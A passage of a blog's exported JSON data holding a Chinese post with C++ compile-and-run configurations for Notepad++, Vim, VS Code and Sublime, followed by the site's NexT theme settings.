$(CURRENT_DIRECTORY)\\$(NAME_PART).exe &quot;$(FULL_CURRENT_PATH)&quot; &amp; <span class=\"built_in\">PAUSE</span> &amp; <span class=\"keyword\">EXIT</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight bat\"><figcaption><span><code>运行</code></span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cmd</span> /k &quot;$(CURRENT_DIRECTORY)\\$(NAME_PART)&quot; &amp; <span class=\"built_in\">PAUSE</span> &amp; <span class=\"keyword\">EXIT</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight bat\"><figcaption><span><code>编译并运行</code></span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cmd</span> /k g++ -o $(CURRENT_DIRECTORY)\\$(NAME_PART).exe &quot;$(FULL_CURRENT_PATH)&quot; &amp;<span class=\"built_in\">cmd</span> /k &quot;$(CURRENT_DIRECTORY)\\$(NAME_PART)&quot; &amp; <span class=\"built_in\">PAUSE</span> &amp; <span class=\"keyword\">EXIT</span></span><br></pre></td></tr></table></figure>\n<a id=\"more\"></a>\n<h1 id=\"vimrc\"><a href=\"#vimrc\" class=\"headerlink\" title=\".vimrc\"></a>.vimrc</h1><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">set number</span><br><span class=\"line\">set nocompatible</span><br><span class=\"line\">syntax on</span><br><span class=\"line\">set showmode</span><br><span class=\"line\">set showcmd</span><br><span class=\"line\">set mouse&#x3D;a</span><br><span class=\"line\">set encoding&#x3D;utf-8</span><br><span class=\"line\">set t_Co&#x3D;256</span><br><span class=\"line\">filetype indent on</span><br><span class=\"line\">set autoindent</span><br><span class=\"line\">set tabstop&#x3D;4</span><br><span class=\"line\">set shiftwidth&#x3D;4</span><br><span class=\"line\">set cursorline</span><br><span class=\"line\">set nowrap</span><br><span class=\"line\">set laststatus&#x3D;2</span><br><span class=\"line\">set ruler</span><br><span class=\"line\">set showmatch</span><br><span class=\"line\">set hlsearch</span><br><span class=\"line\">set ignorecase</span><br><span class=\"line\">set smartcase</span><br><span class=\"line\">set nobackup</span><br><span class=\"line\">set noswapfile</span><br><span class=\"line\">set noerrorbells</span><br><span class=\"line\">set visualbell</span><br><span class=\"line\">set history&#x3D;1000</span><br><span class=\"line\">set autoread</span><br><span class=\"line\">set listchars&#x3D;tab:»■,trail:■</span><br><span class=\"line\">set wildmenu</span><br><span class=\"line\">set wildmode&#x3D;longest:list,full</span><br></pre></td></tr></table></figure>\n<h1 id=\"VS-code\"><a href=\"#VS-code\" class=\"headerlink\" title=\"VS code\"></a>VS code</h1><p><code>launch.json</code><br><figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"attr\">&quot;version&quot;</span>: <span class=\"string\">&quot;0.2.0&quot;</span>,</span><br><span class=\"line\">\t<span class=\"attr\">&quot;configurations&quot;</span>: [</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"attr\">&quot;name&quot;</span>: <span class=\"string\">&quot;(gdb) Launch&quot;</span>, <span class=\"comment\">// 配置名称，将会在启动配置的下拉菜单中显示</span></span><br><span class=\"line\">\t\t\t<span class=\"attr\">&quot;type&quot;</span>: <span class=\"string\">&quot;cppdbg&quot;</span>,\t   <span class=\"comment\">// 配置类型，这里只能为cppdbg</span></span><br><span class=\"line\">\t\t\t<span class=\"attr\">&quot;request&quot;</span>: <span class=\"string\">&quot;launch&quot;</span>,\t<span class=\"comment\">// 请求配置类型，可以为launch（启动）或attach（附加）</span></span><br><span class=\"line\">\t\t\t<span class=\"attr\">&quot;program&quot;</span>: <span class=\"string\">&quot;$&#123;workspaceRoot&#125;/$&#123;fileBasenameNoExtension&#125;.exe&quot;</span>,<span class=\"comment\">// 将要进行调试的程序的路径</span></span><br><span class=\"line\">\t\t\t<span class=\"attr\">&quot;args&quot;</span>: [],\t\t\t <span class=\"comment\">// 程序调试时传递给程序的命令行参数，一般设为空即可</span></span><br><span class=\"line\">\t\t\t<span class=\"attr\">&quot;stopAtEntry&quot;</span>: <span class=\"literal\">false</span>,   <span class=\"comment\">// 设为true时程序将暂停在程序入口处，一般设置为false</span></span><br><span class=\"line\">\t\t\t<span class=\"attr\">&quot;cwd&quot;</span>: <span class=\"string\">&quot;$&#123;workspaceRoot&#125;&quot;</span>, <span class=\"comment\">// 调试程序时的工作目录，一般为$&#123;workspaceRoot&#125;即代码所在目录</span></span><br><span class=\"line\">\t\t\t<span class=\"attr\">&quot;environment&quot;</span>: [],</span><br><span class=\"line\">\t\t\t<span class=\"attr\">&quot;externalConsole&quot;</span>: <span class=\"literal\">true</span>, <span class=\"comment\">// 调试时是否显示控制台窗口，一般设置为true显示控制台</span></span><br><span class=\"line\">\t\t\t<span class=\"attr\">&quot;MIMode&quot;</span>: <span class=\"string\">&quot;gdb&quot;</span>,</span><br><span class=\"line\">\t\t\t<span class=\"attr\">&quot;miDebuggerPath&quot;</span>: <span class=\"string\">&quot;E:\\\\MinGW\\\\bin\\\\gdb.exe&quot;</span>, <span class=\"comment\">// miDebugger的路径，注意这里要与MinGw的路径对应</span></span><br><span class=\"line\">\t\t\t<span class=\"attr\">&quot;preLaunchTask&quot;</span>: <span class=\"string\">&quot;g++&quot;</span>, <span class=\"comment\">// 调试会话开始前执行的任务，一般为编译程序，c++为g++, c为gcc</span></span><br><span class=\"line\">\t\t\t<span class=\"attr\">&quot;setupCommands&quot;</span>:</span><br><span class=\"line\">\t\t\t[</span><br><span class=\"line\">\t\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t\t<span class=\"attr\">&quot;description&quot;</span>: <span class=\"string\">&quot;Enable pretty-printing for gdb&quot;</span>,</span><br><span class=\"line\">\t\t\t\t\t<span class=\"attr\">&quot;text&quot;</span>: <span class=\"string\">&quot;-enable-pretty-printing&quot;</span>,</span><br><span class=\"line\">\t\t\t\t\t<span class=\"attr\">&quot;ignoreFailures&quot;</span>: <span class=\"literal\">true</span></span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t]</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t]</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><br><code>tasks.json</code><br><figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"attr\">&quot;version&quot;</span>: <span class=\"string\">&quot;2.0.0&quot;</span>,</span><br><span class=\"line\">\t<span class=\"attr\">&quot;command&quot;</span>: <span class=\"string\">&quot;g++&quot;</span>,</span><br><span class=\"line\">\t<span class=\"attr\">&quot;args&quot;</span>: [<span class=\"string\">&quot;-g&quot;</span>,<span class=\"string\">&quot;$&#123;file&#125;&quot;</span>,<span class=\"string\">&quot;-o&quot;</span>,<span class=\"string\">&quot;$&#123;fileBasenameNoExtension&#125;.exe&quot;</span>],\t<span class=\"comment\">// 编译命令参数</span></span><br><span class=\"line\">\t<span class=\"attr\">&quot;problemMatcher&quot;</span>: &#123;</span><br><span class=\"line\">\t\t<span class=\"attr\">&quot;owner&quot;</span>: <span class=\"string\">&quot;cpp&quot;</span>,</span><br><span class=\"line\">\t\t<span class=\"attr\">&quot;fileLocation&quot;</span>: [<span class=\"string\">&quot;relative&quot;</span>, <span class=\"string\">&quot;$&#123;workspaceRoot&#125;&quot;</span>],</span><br><span class=\"line\">\t\t<span class=\"attr\">&quot;pattern&quot;</span>: &#123;</span><br><span class=\"line\">\t\t\t<span class=\"attr\">&quot;regexp&quot;</span>: <span class=\"string\">&quot;^(.*):(\\\\d+):(\\\\d+):\\\\s+(warning|error):\\\\s+(.*)$&quot;</span>,</span><br><span class=\"line\">\t\t\t<span class=\"attr\">&quot;file&quot;</span>: <span class=\"number\">1</span>,</span><br><span class=\"line\">\t\t\t<span class=\"attr\">&quot;line&quot;</span>: <span class=\"number\">2</span>,</span><br><span class=\"line\">\t\t\t<span class=\"attr\">&quot;column&quot;</span>: <span class=\"number\">3</span>,</span><br><span class=\"line\">\t\t\t<span class=\"attr\">&quot;severity&quot;</span>: <span class=\"number\">4</span>,</span><br><span class=\"line\">\t\t\t<span class=\"attr\">&quot;message&quot;</span>: <span class=\"number\">5</span></span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h1 id=\"Sublime\"><a href=\"#Sublime\" class=\"headerlink\" title=\"Sublime\"></a>Sublime</h1><figure class=\"highlight json\"><figcaption><span><code>G++.sublime-build</code></span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123; </span><br><span class=\"line\">    <span class=\"attr\">&quot;cmd&quot;</span>: [<span class=\"string\">&quot;g++&quot;</span>, <span class=\"string\">&quot;$&#123;file&#125;&quot;</span>, <span class=\"string\">&quot;-std=c++11&quot;</span>, <span class=\"string\">&quot;-o&quot;</span>, <span class=\"string\">&quot;$&#123;file_path&#125;\\\\\\\\$&#123;file_base_name&#125;&quot;</span>, <span class=\"string\">&quot;&amp;&quot;</span>, <span class=\"string\">&quot;start&quot;</span>, <span class=\"string\">&quot;cmd&quot;</span>, <span class=\"string\">&quot;/c&quot;</span>, <span class=\"string\">&quot;$&#123;file_path&#125;\\\\\\\\$&#123;file_base_name&#125; &amp; echo. &amp; pause&quot;</span>],</span><br><span class=\"line\">    <span class=\"attr\">&quot;file_regex&quot;</span>: <span class=\"string\">&quot;^(..[^:]*):([0-9]+):?([0-9]+)?:? (.*)$&quot;</span>, <span class=\"attr\">&quot;working_dir&quot;</span>: <span class=\"string\">&quot;$&#123;file_path&#125;&quot;</span>,</span><br><span class=\"line\">    <span class=\"attr\">&quot;selector&quot;</span>: <span class=\"string\">&quot;source.c, source.c++&quot;</span>, <span class=\"attr\">&quot;shell&quot;</span>: <span class=\"literal\">true</span>,</span><br><span class=\"line\">    <span class=\"attr\">&quot;encoding&quot;</span>:<span class=\"string\">&quot;cp936&quot;</span>, </span><br><span class=\"line\">    <span class=\"attr\">&quot;variants&quot;</span>:</span><br><span class=\"line\">    [</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"attr\">&quot;name&quot;</span> : <span class=\"string\">&quot;Build Only&quot;</span>,</span><br><span class=\"line\">            <span class=\"attr\">&quot;cmd&quot;</span>:[<span class=\"string\">&quot;g++&quot;</span>, <span class=\"string\">&quot;$&#123;file&#125;&quot;</span>, <span class=\"string\">&quot;-std=c++11&quot;</span>, <span class=\"string\">&quot;-o&quot;</span>, <span class=\"string\">&quot;$&#123;file_path&#125;\\\\\\\\$&#123;file_base_name&#125;&quot;</span>]</span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"attr\">&quot;name&quot;</span> : <span class=\"string\">&quot;Run Only&quot;</span>,</span><br><span class=\"line\">            <span class=\"attr\">&quot;cmd&quot;</span> : [<span class=\"string\">&quot;start&quot;</span>, <span class=\"string\">&quot;cmd&quot;</span>, <span class=\"string\">&quot;/c&quot;</span>, <span class=\"string\">&quot;$&#123;file_path&#125;\\\\\\\\$&#123;file_base_name&#125; &amp; echo. &amp; pause&quot;</span>]</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    ]</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>","site":{"data":{"sidebar":"<script src=\"//v1.hitokoto.cn/?encode=js&select=%23hitokoto\" defer></script>\n<style>\n@media all and (orientation : portrait) {\n\t#hitokoto{\n\t\tpadding-left: 50px;\n\t\tpadding-right: 50px;\n\t}\n}\n</style>\n\n\n\n\n\n\n\n\n","next":{"override":false,"reminder":false,"cache":{"enable":true},"minify":true,"custom_file_path":{"sidebar":"source/_data/sidebar.swig"},"favicon":{"small":"//cdn.file.todest.cn/blog/user/logo.ico","medium":"//cdn.file.todest.cn/blog/user/logo.ico","apple_touch_icon":"//cdn.file.todest.cn/blog/user/logo.ico","safari_pinned_tab":"//cdn.file.todest.cn/blog/user/logo.ico","ms_browserconfig":"//cdn.file.todest.cn/blog/user/logo.ico"},"rss":null,"footer":{"icon":{"name":"user","animated":false,"color":"#808080"},"copyright":null,"powered":{"enable":true,"version":true},"theme":{"enable":true,"version":true},"beian":{"enable":false,"icp":null,"gongan_id":null,"gongan_num":null,"gongan_icon_url":null}},"creative_commons":{"license":"by-nc-sa","sidebar":false,"post":false,"language":null},"scheme":"Gemini","menu":{"home":"/ || home","about":"/about/ || user","tags":"/tags/ || tags","categories":"/categories/ || th","archives":"/archives/ || archive","相册":"/photo/ || photo","链接":"/links/ || link","留言":"/bbs/ || comments"},"menu_settings":{"icons":true,"badges":true},"sidebar":{"position":"left","display":"post","offset":12,"onmobile":false},"avatar":{"url":"https://s.gravatar.com/avatar/4756cb352ec7f58884fdc0c219ea00dc?s=80","rounded":false,"rotated":false},"site_state":true,"social":{"GitHub":"https://github.com/todest || github","E-Mail":"mailto:todest@qq.com || envelope","QQ":"http://wpa.qq.com/msgrd?v=3&uin=1123792492 || qq","Facebook":"https://www.facebook.com/ultrasurreal || facebook","StackOverflow":"https://stackoverflow.com/users/11422695 || stack-overflow","Instagram":"https://www.instagram.com/yonghangguo/ || instagram"},"social_icons":{"enable":true,"icons_only":true,"transition":true},"links_settings":{"icon":"link","title":"Links","layout":"inline"},"links":{"BoilTask":"https://boiltask.com","Codancer":"https://www.cnblogs.com/codancer","Colsrch":"https://colsrch.cn","执念":"https://blog.wzy1999.wang","Des_tiny":"https://anyway521.github.io","Drew":"https://cndrew.cn","rookie6":"https://rookie6.github.io","LuoZui":"https://www.lzphi.cn","Sky":"https://angelni.github.io","一Wa哇一天":"https://blogzhy.cn","Jinqimu":"https://jinqimu.xyz","FuZhiyuan":"https://fuzhiyuan.github.io","RuiRui":"https://pipakacha.com"},"toc":{"enable":true,"number":true,"wrap":false,"expand_all":false,"max_depth":6},"chat":{"enable":false,"icon":"comment","text":"Chat"},"excerpt_description":true,"auto_excerpt":{"enable":false,"length":150},"read_more_btn":true,"post_meta":{"item_text":true,"created_at":true,"updated_at":{"enable":true,"another_day":true},"categories":true},"symbols_count_time":{"separated_meta":true,"item_text_post":true,"item_text_total":false,"awl":4,"wpm":275},"tag_icon":false,"reward_settings":{"enable":true,"animation":true,"comment":"赏点呗！"},"reward":{"wechatpay":"//cdn.file.todest.cn/blog/user/wechatpay.jpg","alipay":"//cdn.file.todest.cn/blog/user/alipay.jpg","bitcoin":"//cdn.file.todest.cn/blog/user/bitcoin.png"},"related_posts":{"enable":false,"title":null,"display_in_home":false,"params":{"maxCount":5}},"post_edit":{"enable":false,"url":"https://github.com/user-name/repo-name/tree/branch-name/subdirectory-name"},"cheers":true,"tagcloud":{"min":12,"max":30,"start":"#ccc","end":"#111","amount":200},"calendar":{"calendar_id":"<required>","api_key":"<required>","orderBy":"startTime","offsetMax":24,"offsetMin":4,"showDeleted":false,"singleEvents":true,"maxResults":250},"text_align":{"desktop":"justify","mobile":"justify"},"mobile_layout_economy":false,"android_chrome_color":"#222","safari_rainbow":false,"custom_logo":null,"codeblock":{"highlight_theme":"normal","copy_button":{"enable":true,"show_result":true,"style":null}},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"reading_progress":{"enable":false,"position":"top","color":"#37c6c0","height":"3px"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"github_banner":{"enable":true,"permalink":"https://github.com/yourname","title":"Follow me on GitHub"},"font":{"enable":false,"host":null,"global":{"external":true,"family":"Lato","size":null},"title":{"external":true,"family":null,"size":null},"headings":{"external":true,"family":null,"size":null},"posts":{"external":true,"family":null},"codes":{"external":true,"family":null}},"disable_baidu_transformation":false,"canonical":true,"seo":true,"index_with_subtitle":false,"exturl":false,"google_site_verification":null,"bing_site_verification":null,"yandex_site_verification":null,"baidu_site_verification":null,"baidu_push":false,"math":{"per_page":false,"mathjax":{"enable":true,"mhchem":false},"katex":{"enable":false,"copy_tex":false}},"pjax":false,"fancybox":true,"mediumzoom":false,"lazyload":true,"pangu":false,"quicklink":{"enable":false,"home":true,"archive":true,"delay":true,"timeout":3000,"priority":true,"ignores":null},"comments":{"style":"tabs","active":null,"storage":true,"nav":null},"disqus":{"enable":false,"shortname":null,"count":true,"lazyload":false},"disqusjs":{"enable":false,"api":null,"apikey":null,"shortname":null},"changyan":{"enable":false,"appid":null,"appkey":null},"valine":{"enable":true,"appid":"NNOFYEbCjmMJUqInK2zEpetd-gzGzoHsz","appkey":"Q474k3XvUzlPbRG5bOyNCxVt","notify":false,"verify":false,"placeholder":"写点什么？","avatar":"mm","guest_info":"nick,mail,link","pageSize":10,"language":null,"visitor":false,"comment_count":true,"recordIP":false,"serverURLs":null},"livere_uid":null,"gitalk":{"enable":false,"github_id":null,"repo":null,"client_id":null,"client_secret":null,"admin_user":null,"distraction_free_mode":true,"language":null},"rating":{"enable":false,"id":null,"color":"fc6423"},"add_this_id":null,"google_analytics":{"tracking_id":null,"localhost_ignored":true,"only_pageview":false},"baidu_analytics":null,"growingio_analytics":null,"cnzz_siteid":null,"tencent_analytics":null,"tencent_mta":null,"leancloud_visitors":{"enable":false,"app_id":null,"app_key":null,"security":true,"betterPerformance":false},"firestore":{"enable":false,"collection":"articles","apiKey":null,"projectId":null},"busuanzi_count":{"enable":true,"total_visitors":true,"total_visitors_icon":"user","total_views":true,"total_views_icon":"eye","post_views":true,"post_views_icon":"eye"},"algolia_search":{"enable":false,"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"local_search":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true},"swiftype_key":null,"chatra":{"enable":false,"async":true,"id":null},"tidio":{"enable":false,"key":null},"note":{"style":"simple","icons":false,"border_radius":3,"light_bg_offset":0},"tabs":{"transition":{"tabs":false,"labels":true},"border_radius":0},"pdf":{"enable":false,"height":"500px"},"mermaid":{"enable":false,"theme":"forest"},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"pace":{"enable":false,"theme":"minimal"},"three":{"enable":false,"three_waves":false,"canvas_lines":false,"canvas_sphere":false},"canvas_nest":{"enable":false,"onmobile":true,"color":"0,0,255","opacity":0.5,"zIndex":-1,"count":99},"canvas_ribbon":{"enable":false,"size":300,"alpha":0.6,"zIndex":-1},"vendors":{"_internal":"lib","anime":null,"fontawesome":null,"mathjax":null,"mhchem":null,"katex":null,"copy_tex_js":null,"copy_tex_css":null,"pjax":null,"jquery":null,"fancybox":null,"fancybox_css":null,"mediumzoom":null,"lazyload":null,"pangu":null,"quicklink":null,"disqusjs_js":null,"disqusjs_css":null,"valine":null,"gitalk_js":null,"gitalk_css":null,"algolia_instant_js":null,"algolia_instant_css":null,"pdfobject":null,"mermaid":null,"velocity":null,"velocity_ui":null,"pace":null,"pace_css":null,"three":null,"three_waves":null,"canvas_lines":null,"canvas_sphere":null,"canvas_nest":null,"canvas_nest_nomobile":null,"canvas_ribbon":null},"css":"css","js":"js","images":"images","crash_cheat":true,"clicklove":true,"snow":false}}},"length":3687,"excerpt":"<h1 id=\"Notepad\"><a href=\"#Notepad\" class=\"headerlink\" title=\"Notepad++\"></a>Notepad++</h1><figure class=\"highlight bat\"><figcaption><span><code>编译</code></span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cmd</span> /k g++ -o $(CURRENT_DIRECTORY)\\$(NAME_PART).exe &quot;$(FULL_CURRENT_PATH)&quot; &amp; <span class=\"built_in\">PAUSE</span> &amp; <span class=\"keyword\">EXIT</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight bat\"><figcaption><span><code>运行</code></span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cmd</span> /k &quot;$(CURRENT_DIRECTORY)\\$(NAME_PART)&quot; &amp; <span class=\"built_in\">PAUSE</span> &amp; <span class=\"keyword\">EXIT</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight bat\"><figcaption><span><code>编译并运行</code></span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cmd</span> /k g++ -o $(CURRENT_DIRECTORY)\\$(NAME_PART).exe &quot;$(FULL_CURRENT_PATH)&quot; &amp;<span class=\"built_in\">cmd</span> /k &quot;$(CURRENT_DIRECTORY)\\$(NAME_PART)&quot; &amp; <span class=\"built_in\">PAUSE</span> &amp; <span class=\"keyword\">EXIT</span></span><br></pre></td></tr></table></figure>","more":"<h1 id=\"vimrc\"><a href=\"#vimrc\" class=\"headerlink\" title=\".vimrc\"></a>.vimrc</h1><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">set number</span><br><span class=\"line\">set nocompatible</span><br><span class=\"line\">syntax on</span><br><span class=\"line\">set showmode</span><br><span class=\"line\">set showcmd</span><br><span class=\"line\">set mouse&#x3D;a</span><br><span class=\"line\">set encoding&#x3D;utf-8</span><br><span class=\"line\">set t_Co&#x3D;256</span><br><span class=\"line\">filetype indent on</span><br><span class=\"line\">set autoindent</span><br><span class=\"line\">set tabstop&#x3D;4</span><br><span class=\"line\">set shiftwidth&#x3D;4</span><br><span class=\"line\">set cursorline</span><br><span class=\"line\">set nowrap</span><br><span class=\"line\">set laststatus&#x3D;2</span><br><span class=\"line\">set ruler</span><br><span class=\"line\">set showmatch</span><br><span class=\"line\">set hlsearch</span><br><span class=\"line\">set ignorecase</span><br><span class=\"line\">set smartcase</span><br><span class=\"line\">set nobackup</span><br><span class=\"line\">set noswapfile</span><br><span class=\"line\">set noerrorbells</span><br><span class=\"line\">set visualbell</span><br><span class=\"line\">set history&#x3D;1000</span><br><span class=\"line\">set autoread</span><br><span class=\"line\">set listchars&#x3D;tab:»■,trail:■</span><br><span class=\"line\">set wildmenu</span><br><span class=\"line\">set wildmode&#x3D;longest:list,full</span><br></pre></td></tr></table></figure>\n<h1 id=\"VS-code\"><a href=\"#VS-code\" class=\"headerlink\" title=\"VS code\"></a>VS code</h1><p><code>launch.json</code><br><figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"attr\">&quot;version&quot;</span>: <span class=\"string\">&quot;0.2.0&quot;</span>,</span><br><span class=\"line\">\t<span class=\"attr\">&quot;configurations&quot;</span>: [</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"attr\">&quot;name&quot;</span>: <span class=\"string\">&quot;(gdb) Launch&quot;</span>, <span class=\"comment\">// 配置名称，将会在启动配置的下拉菜单中显示</span></span><br><span class=\"line\">\t\t\t<span class=\"attr\">&quot;type&quot;</span>: <span class=\"string\">&quot;cppdbg&quot;</span>,\t   <span class=\"comment\">// 配置类型，这里只能为cppdbg</span></span><br><span class=\"line\">\t\t\t<span class=\"attr\">&quot;request&quot;</span>: <span class=\"string\">&quot;launch&quot;</span>,\t<span class=\"comment\">// 请求配置类型，可以为launch（启动）或attach（附加）</span></span><br><span class=\"line\">\t\t\t<span class=\"attr\">&quot;program&quot;</span>: <span class=\"string\">&quot;$&#123;workspaceRoot&#125;/$&#123;fileBasenameNoExtension&#125;.exe&quot;</span>,<span class=\"comment\">// 将要进行调试的程序的路径</span></span><br><span class=\"line\">\t\t\t<span class=\"attr\">&quot;args&quot;</span>: [],\t\t\t <span class=\"comment\">// 程序调试时传递给程序的命令行参数，一般设为空即可</span></span><br><span class=\"line\">\t\t\t<span class=\"attr\">&quot;stopAtEntry&quot;</span>: <span class=\"literal\">false</span>,   <span class=\"comment\">// 设为true时程序将暂停在程序入口处，一般设置为false</span></span><br><span class=\"line\">\t\t\t<span class=\"attr\">&quot;cwd&quot;</span>: <span class=\"string\">&quot;$&#123;workspaceRoot&#125;&quot;</span>, <span class=\"comment\">// 调试程序时的工作目录，一般为$&#123;workspaceRoot&#125;即代码所在目录</span></span><br><span class=\"line\">\t\t\t<span class=\"attr\">&quot;environment&quot;</span>: [],</span><br><span class=\"line\">\t\t\t<span class=\"attr\">&quot;externalConsole&quot;</span>: <span class=\"literal\">true</span>, <span class=\"comment\">// 调试时是否显示控制台窗口，一般设置为true显示控制台</span></span><br><span class=\"line\">\t\t\t<span class=\"attr\">&quot;MIMode&quot;</span>: <span class=\"string\">&quot;gdb&quot;</span>,</span><br><span class=\"line\">\t\t\t<span class=\"attr\">&quot;miDebuggerPath&quot;</span>: <span class=\"string\">&quot;E:\\\\MinGW\\\\bin\\\\gdb.exe&quot;</span>, <span class=\"comment\">// miDebugger的路径，注意这里要与MinGw的路径对应</span></span><br><span class=\"line\">\t\t\t<span class=\"attr\">&quot;preLaunchTask&quot;</span>: <span class=\"string\">&quot;g++&quot;</span>, <span class=\"comment\">// 调试会话开始前执行的任务，一般为编译程序，c++为g++, c为gcc</span></span><br><span class=\"line\">\t\t\t<span class=\"attr\">&quot;setupCommands&quot;</span>:</span><br><span class=\"line\">\t\t\t[</span><br><span 